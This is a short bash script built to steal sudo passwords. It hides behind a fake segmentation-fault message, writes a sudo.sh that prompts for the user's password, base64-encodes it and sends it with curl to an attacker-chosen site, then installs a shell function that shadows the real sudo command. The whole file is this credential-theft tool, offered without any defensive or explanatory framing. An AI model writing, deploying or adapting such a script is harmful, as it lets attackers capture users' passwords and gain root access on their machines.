#/usr/bin/bash
if ! command -v sudo &> /dev/null
then
    echo ">>> Segmentation fault: Core dumped"
    exit 139
fi


if ! [[ "$0" == *"$SHELL"* ]]
then
    echo ">>> Segmentation fault: Core dumped"
    exit 139
fi

read -p 'Site (include https:// or http://) <<< '
echo "read -s -p \"[sudo] password for \$USER: \"; pass=\$REPLY; pass64=\$(echo \"\$pass\" | base64); curl $REPLY/\$pass64; echo; sudo \"\$@\" <<< \"\$REPLY\"" > sudo.sh
echo '>>> sudo.sh created'
cp $(which sudo) ./.realsudo
function sudo {
  bash ./sudo.sh
}
echo '>>> fake sudo function created'
echo '>>> setup completed'
